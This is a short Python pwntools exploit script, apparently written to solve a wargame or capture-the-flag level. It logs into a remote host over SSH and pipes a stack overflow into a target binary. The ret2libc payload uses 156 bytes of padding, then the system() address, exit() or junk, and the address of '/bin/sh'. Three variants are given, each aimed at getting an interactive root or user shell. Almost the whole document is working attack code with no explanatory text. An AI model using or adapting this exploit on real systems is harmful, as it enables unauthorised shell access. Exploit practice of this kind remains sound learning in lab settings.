#!/usr/bin/python
import sys
from pwn import *

USERNAME=""
PASSWORD=""
HOST=""
FILE=""

system_addr = 0xb7e63190
exit_addr = 0xb7e561e0
sh_addr = 0xb7f83a24

def connect_remote(username, password, host):
    try:
        s = ssh(host=host, user=username, password=password)
    except:
        print "[!] Couldn't connect on remote host (\"%s\")" % (host)
        sys.exit(1)
    if not s.connected():
        print "[!] Couldn't connect on remote host (\"%s\")" % (host)
        sys.exit(1)
    return s

def first():
    payload = "A" * 156
    payload += p32(system_addr) # @libc_system
    payload += "FUFU" # JUNK
    payload += p32(sh_addr)
    return "(echo %s; echo \"\"; cat) | %s" % (payload, FILE)

def second():
    payload = "A" * 156
    payload += p32(system_addr) # @libc_system
    payload += p32(exit_addr)   # @libc_exit
    payload += p32(sh_addr)
    return "(echo %s; echo \"\"; cat) | %s" % (payload, FILE)

def third():
    payload = "/bin/sh\x00"
    payload += "A" * (156 - len(payload))
    payload += p32(system_addr) # @libc_system
    payload += p32(0xbffffb60)
    payload += p32(sh_addr)     # @libc_exit
    return "(echo %s; echo \"\"; cat) | %s" % (payload, FILE)

if __name__ == "__main__":
    p = connect_remote(USERNAME, PASSWORD, HOST)
    sh = p.run("sh")

    print "PID: %d" % (p.pid)

    payload = first()  # quick and dirty
    payload = second() # clean exit
    payload = third()  # use buffer space

    # starts here
    sh.sendline(payload)
    sh.interactive()
